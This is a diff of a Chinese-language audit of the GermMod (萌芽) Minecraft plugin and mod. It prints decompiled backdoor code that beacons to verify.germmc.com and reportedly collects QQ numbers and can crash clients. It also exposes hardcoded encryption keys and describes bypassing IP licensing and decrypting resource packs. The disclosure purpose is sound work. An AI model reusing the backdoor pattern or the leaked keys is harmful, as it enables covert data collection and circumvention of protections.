@@ -1,5 +1,17 @@
 # 萌芽后门总结
-对萌芽引擎中存在的所有后门和可能的泄露隐私点进行总结，其中包括混淆器自动插入的和如何处理这些后门，有空再补充mod部分
+对萌芽引擎中存在的所有后门和可能的泄露隐私点进行总结，其中包括混淆器自动插入的和如何处理这些后门。
+
+如果你需要审计使用的反混淆过的jar，请在issue下留下自己的邮箱吗，我会将反混淆过的jar发送到你的邮箱下。
+# 文中后门定义
+后门是软件开发过程中引入的。在软件的开发阶段，程序员常会在软件内创建后门以方便测试或者修改程序中的缺陷，但在软件发布时，后门被有意或者无意忽视了，没有被删除，那么这个软件天生就存在后门，安装该软件的主机就不可避免的引入了后门。
+
+以我来看，你习以为常的操作不等于说它不是后门，这些都是影响服务器稳定的危险因素。
+
+举个例子，如果我想用老版本萌芽，但是因为写了时间限制代码，导致老版本无法使用，而新版本又因为bug等原因无法使用，这影响了服务器系统的稳定性和长期可靠性。
+
+再举个例子，如文中插件后门#2，一旦开发者触发，会导致所有分发的萌芽插件副本无法使用，会造成所有萌芽服务器被迫终止业务，这无疑也是对现有服务器稳定性的巨大危害。
+
+再举个例子，如文中mod后门#1，如果开发者因为受贿等原因，需要使得指定服务器业务终止，他就可以通过远程发送崩端包到目标客户群体的客户端，使得该服务器玩家全部崩端，这更不用说危害有多大。
 # 插件部分
 插件部分后门并不多且危害不大
 
@@ -324,4 +336,200 @@ public class re {
 说明:内置了一个测试用的cdK,可以通过channelpipeline定位到验证代码，这个cdk是标准版的
 
 ## mod部分
-mod部分反混淆复杂且后门危害性较强，留待后续补充，先写好插件部分
+
+1.长链接客户端远程操控后门
+
+相关代码
+````java
+
+    private final int Field6525 = 29975;
+    public static final boolean Field6526 = false;
+    private final String Field6527;
+    private final String Field6528;
+    
+    @HideAccess
+    public void Method9771() throws Exception {
+        NioEventLoopGroup nioEventLoopGroup = new NioEventLoopGroup(1);
+        try {
+            Bootstrap bootstrap = new Bootstrap();
+            nu.Method9773("-u3bj8f", (Bootstrap)nu.Method9773("-1ou7j8g", (Bootstrap)nu.Method9773("-18b7j8j", (Bootstrap)nu.Method9773("-1eqdj8k", bootstrap, nioEventLoopGroup), NioSocketChannel.class), (ChannelOption)r.Method7853(-908119310), (Object)30000), (Object)new nu1(this));
+            Channel channel = nu.Method9773("6lucp6", bootstrap, new InetSocketAddress("verify.germmc.com", 29975)).sync().channel();
+            ar.Method9392(channel);
+            ArrayList<String> arrayList = new ArrayList<String>();
+            arrayList.addAll(cba.Method10544());
+            arrayList.addAll(ada.Method10520().Method10522());
+            ar.Method9393(new gz("4.4.0", arrayList, iq.Method10616(), mq1.Method7227()));
+            mw.Method6460();
+            channel.closeFuture().sync();
+            return;
+        } finally {
+            nioEventLoopGroup.shutdownGracefully();
+        }
+    }
+
+    public static void Method9772() throws InterruptedException {
+        CompletableFuture.runAsync(() -> {
+            this.Field6528 = "verify.germmc.com";
+            this.Field6527 = "127.0.0.1";
+            this.Field6528 = "verify.germmc.com";
+            this.Field6527 = "127.0.0.1";
+            try {
+                this.Method9771();
+            } catch (Exception exception) {
+                // empty catch block
+            }
+        });
+        Class<edb> clazz = edb.class;
+        synchronized (clazz) {
+            edb.class.wait(13333L);
+            return;
+        }
+    }
+````
+
+这段代码展示了，萌芽模组如何链接到后门服务器，以及进行相关内容发送，详细信息见 https://github.com/PillowFrame/VirtualGermModBackDoorServer
+
+危害：远程非法收集用户主机上包括QQ号等隐私信息到萌芽作者自己的服务器，远程指定特定客户端崩端
+
+2.内置不受IP认证限制的服务器
+
+相关代码
+````java
+@HideAccess
+    public hw() {
+        this.Field4801 = "GermMod.so";
+        this.Field4797 = "GermMod32.dll";
+        this.Field4797 = "GermMod32.dll";
+        this.Field4801 = "GermMod.so";
+        ((List)r.Method7851(this, -678350049)).add("play.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("remote2.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("pan.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("forum.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("play.fkdg.net");
+        ((List)r.Method7851(this, -678350049)).add("play.rpgcraft.cn");
+        ((List)r.Method7851(this, -678350049)).add("lt.rpgcraft.cn");
+        ((List)r.Method7851(this, -678350049)).add("dx.rpgcraft.cn");
+        ((List)r.Method7851(this, -678350049)).add("yd.rpgcraft.cn");
+        ((List)r.Method7851(this, -678350049)).add("s1.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s2.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s3.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s4.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s5.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s6.germmc.com");
+        ((List)r.Method7851(this, -678350049)).add("s7.germmc.com");
+        try {
+            Object object;
+            Object object2;
+            File file = (File)r.Method7853(109261602);
+            pj pj2 = new pj(file);
+            om om2 = pj2.Method1519(pj2.Method1478("GermMod32.dll"));
+            byte[] byArray = IOUtils.readFully((InputStream)om2, (int)1024);
+            if (byArray[0] != 71) {
+                return;
+            }
+            Object object3 = new ArrayList<Byte>();
+            for (int i = 1; i < 1024 && (byArray[i] != 59 || byArray[i + 1] != 0); ++i) {
+                if (byArray[i] == 59 && byArray[i + 1] == 10) {
+                    object2 = new byte[((ArrayList)object3).size()];
+                    IntStream.range(0, ((ArrayList)object3).size()).forEach(arg_0 -> hw.Method7863((byte[])object2, (ArrayList)object3, arg_0));
+                    object = (byte[])hw.Method7865("1618col", "?:P)(OL><KI*&UJM785^%TGB416$#EDCXSW@!QAZ", (byte[])object2);
+                    String string = new String((byte[])object, (Charset)r.Method7853(1962816282)).toLowerCase((Locale)r.Method7853(-1221119205));
+                    ((List)r.Method7851(this, -678350049)).add(string);
+                    if (string.startsWith("ws://")) {
+                        ((List)r.Method7851(this, -678350049)).add(string.replace("ws://", ""));
+                    }
+                    ++i;
+                    ((ArrayList)object3).clear();
+                    continue;
+                }
+                ((ArrayList)object3).add(byArray[i]);
+            }
+            om2 = pj2.Method1519(pj2.Method1478("GermMod.so"));
+            byArray = IOUtils.readFully((InputStream)om2, (int)2048);
+            if (byArray[0] != 71) {
+                return;
+            }
+            object3 = new String(byArray, (Charset)r.Method7853(1962816282));
+            String[] stringArray = ((String)object3).substring(1).split("@@@");
+            object2 = stringArray[0];
+            object = stringArray[1];
+            this.Field4803 = new String((byte[])hw.Method7865("-14nj6f", ((String)object2).getBytes((Charset)r.Method7853(1962816282))), (Charset)r.Method7853(1962816282));
+            this.Field4796 = new String((byte[])hw.Method7865("-14nj6f", ((String)object).getBytes((Charset)r.Method7853(1962816282))), (Charset)r.Method7853(1962816282));
+        } catch (Throwable throwable) {
+        } finally {
+            hw.Method7865("-ntdj7a", (String)r.Method7851(this, -827444418));
+        }
+    }
+````
+
+从中我们不难看出，不受IP限制的服务器有
+- play.germmc.com
+- remote2.germmc.com
+- pan.germmc.com
+- forum.germmc.com
+- play.fkdg.net
+- play.rpgcraft.cn
+- lt.rpgcraft.cn
+- dx.rpgcraft.cn
+- yd.rpgcraft.cn
+- s1.germmc.com
+- s2.germmc.com
+- s3.germmc.com
+- s4.germmc.com
+- s5.germmc.com
+- s6.germmc.com
+- s7.germmc.com
+以及泄露的关键信息为，其加密密钥为``?:P)(OL><KI*&UJM785^%TGB416$#EDCXSW@!QAZ``(萌芽Cache也使用该密钥进行加解密)，想要修改IP限制，参考项目 https://github.com/PillowFrame/GermModHideInfoExtracter
+
+3.材质包加密原理
+
+这并不是后门，但是我懒得开一个新的项目专门写萌芽原理解析专题了，我不觉得萌芽的材质包加密哪里神秘，就是一个ZIP加密通过服务器下发密钥，并且网络传输过程中通过指定密钥进行加密。
+
+我倒是想问问萌芽作者，你就这点水平，你又没有自己的压缩方法和技术，也没有自己的加密方法，你有什么可牛的？这点三脚猫功夫也让你吹上天了。
+
+````java
+    public static void Method303(Player player) {
+        block3: {
+            block2: {
+                if (!sl1.Method341(hm.Method537().isList("ResourcePacks") ? 1 : 0)) break block2;
+                Iterator iterator = hm.Method537().getStringList("ResourcePacks").iterator();
+                while (sl1.Method341(iterator.hasNext() ? 1 : 0)) {
+                    String string = (String)iterator.next();
+                    String[] stringArray = string.split("<->", 2);
+                    GermPacketAPI.send(player, new lc(stringArray[0], gj.Method431(stringArray[1].getBytes(Charset.defaultCharset()))));
+                }
+                break block3;
+            }
+            if (!sl1.Method341(hm.Method537().isConfigurationSection("ResourcePacks") ? 1 : 0)) break block3;
+            Iterator iterator = hm.Method537().getConfigurationSection("ResourcePacks").getKeys(false).iterator();
+            while (sl1.Method341(iterator.hasNext() ? 1 : 0)) {
+                String string = (String)iterator.next();
+                String string2 = hm.Method537().getString(new StringBuilder().insert(0, "ResourcePacks.").append(string).toString());
+                GermPacketAPI.send(player, new lc(string, gj.Method431(string2.getBytes(Charset.defaultCharset()))));
+            }
+        }
+    }
+    private static byte[] Method428(byte[] byArray) {
+        byte[] byArray2 = null;
+        try {
+            Key key = gj.Method432("!QAZ@WSX#EDCARFKAREWRTG8734TGYQR");
+            Cipher cipher = Cipher.getInstance("DES");
+            cipher.init(1, key);
+            byArray2 = cipher.doFinal(byArray);
+            return byArray2;
+        } catch (Exception exception) {
+            exception.printStackTrace();
+            return byArray2;
+        } finally {
+            Object var2_5 = null;
+        }
+    }
+
+    public static String Method431(byte[] byArray) {
+        return Base64.encodeBase64String(gj.Method428(byArray));
+    }
+````
+
+从代码中不难一眼看出，其加密密钥为``!QAZ@WSX#EDCARFKAREWRTG8734TGYQR``，且加密方法为公开的加密方法``DES``，发送材质包密码也无非是通过该DES密钥加密后发放给客户端，客户端使用相同的DES密钥解密后拿去当作zip密码进行解压。
+
+如何从客户端提取和相关方法我就不写示例代码了，太简单了，插件反混淆搜索``ResourcePacks``关键字一下就定位到这个代码了，抓包拿到直接用密钥解就可以，完全没难度。具体如何定位到哪个包才是，自己原理分析吧，我不想提供具体的方法。
